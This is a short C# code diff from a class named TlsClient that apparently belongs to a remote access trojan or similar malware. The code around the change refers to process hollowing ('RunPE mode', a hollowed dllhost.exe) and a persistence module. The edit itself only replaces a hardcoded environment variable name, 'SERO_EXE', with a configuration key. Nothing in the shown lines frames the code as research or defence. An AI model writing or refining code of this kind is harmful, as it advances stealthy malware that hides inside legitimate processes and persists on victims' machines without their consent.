@@ -1973,7 +1973,7 @@ internal class TlsClient : IDisposable
 
             // In RunPE mode, ProcessPath = hollowed target (dllhost.exe etc.) — use SERO_EXE instead
             var selfPath = ProcessHollowing.IsHollowedInstance()
-                ? (Environment.GetEnvironmentVariable("SERO_EXE") ?? Persistence.GetInstalledPath(Config.PersistName))
+                ? (Environment.GetEnvironmentVariable(Config.EnvKeyExe) ?? Persistence.GetInstalledPath(Config.PersistName))
                 : (Persistence.GetInstalledPath(Config.PersistName) ?? Environment.ProcessPath);
 
             var appDataDir = Path.Combine(
